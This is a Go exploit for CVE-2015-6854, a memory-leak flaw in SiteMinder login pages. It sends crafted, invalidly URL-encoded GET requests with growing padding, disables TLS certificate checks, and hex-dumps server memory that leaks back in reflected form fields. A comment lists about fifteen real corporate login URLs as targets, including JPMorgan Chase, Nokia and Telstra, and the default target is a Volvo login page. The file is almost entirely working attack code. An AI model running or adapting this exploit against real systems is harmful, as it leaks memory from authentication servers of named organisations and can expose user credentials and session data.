/*
This is an exploit for CVE-2015-6854 (likely similar for CVE-2015-6853)
The web server will reflect a GET input value back to us
The web server will "successfully" decode invalid URL encoded data
This allows us to leak bytes past the end of our input value, up until the next null byte (or segfault).
I alternatively dubbed it: printf("%s", heartbleed)
*/
package main

import (
	"crypto/tls"
	"encoding/hex"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"regexp"
	"strings"
)
/*
-url 'https://online.networks.nokia.com/siteminderagent/forms/login.fcc?smquerydata='
-url 'https://apps.gsfsgroup.com/auth/login.fcc?smquerydata=' -regex '<input type="hidden" name="smquerydata" value="(.*)">'
-url 'https://btalent.bombardier.com/siteminderagent/btalent/login.fcc?smquerydata='
-url 'https://aeweq.acsaetna.com/login.fcc?smquerydata=' -regex '<input type="hidden" name="smquerydata" value="(.*)">'
-url 'https://bcw.mybenefitscalwin.org/siteminderagent/forms/login.fcc?smquerydata='
-url 'https://gp.amer.csc.com/siteminderagent/forms/login_error.dxc.fcc?smagentname=' -regex "'smagentname'\).value = \"(.*)\";"
-url 'https://smportal.jpmorganchase.com/siteminderagent/SSOlogin.fcc?smagentname=' -regex '<input type="hidden" name="smagentname" value="(.*)/>'
-url 'https://telstra.com/siteminderagent/login/bdumcustlogin.fcc?target=' -regex '<input type=hidden name=target value="(.*)/>'
-url 'https://saml.ryder.com/siteminderagent/forms/login.fcc?smquerydata=' -regex '<input type=hidden name=smquerydata value="(.*)/>'
-url 'https://www2.wm.com/siteminderagent/forms/login.fcc?smquerydata='
-url 'https://www.sasktel.com/siteminderagent/forms/Sasktel.fcc?smagentname=' -regex '<input type=hidden name=smagentname value="(.*)>'
-url 'https://www.myclientlinenm.net/siteminderagent/forms/login.fcc?smagentname=' -regex '<input type=hidden name=smagentname value="(.*)">'
-url 'https://my.businessaircraft.bombardier.com/siteminderagent/forms/login.fcc?smagentname=' -regex '<input type=hidden name=smagentname value="(.*)'
-url 'https://swpf.skandia.se/siteminderagent/forms/login.fcc?smagentname=' -regex '<input type=hidden name=smagentname value="(.*)'
-url 'https://secure.extranet.hydro.com/loginform/authservices/login.fcc?smagentname=' -regex "<input type='hidden' name='smagentname' value='(.*)'"
*/
func main() {
	regex := flag.String("regex", "<input type=hidden name=smquerydata value=\"(.*)\">", "Regex with submatch to retrieve output")
	baseurl := flag.String("url", "https://secure2.volvo.com/siteminderagent/forms/login.fcc?SMQUERYDATA=", "url to check, value to check last") // Chrysler have patched, here's the same bug for Volvo!
	flag.Parse()
	match := regexp.MustCompile(*regex)
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true, // here be dragons
			},
		},
	}
	pad := 0
	for {
		url := fmt.Sprintf("%s%s%%", *baseurl, strings.Repeat("x", pad))
		req, e := http.NewRequest("GET", url, nil)
		if e != nil {
			fmt.Println(e)
			continue
		}
		r, e := client.Do(req)
		if e != nil {
			fmt.Println(e)
			return
		}
		body, e := ioutil.ReadAll(r.Body)
		r.Body.Close()
		if e != nil {
			fmt.Println(e)
			continue
		}
		fmt.Println(r.Status, "-", pad)
		leaks := match.FindSubmatch(body)
		if len(leaks) > 1 && len(leaks[1]) > pad {
			dump := hex.Dump(leaks[1][pad:])
			fmt.Print(dump)
		}
		pad++
	}
}
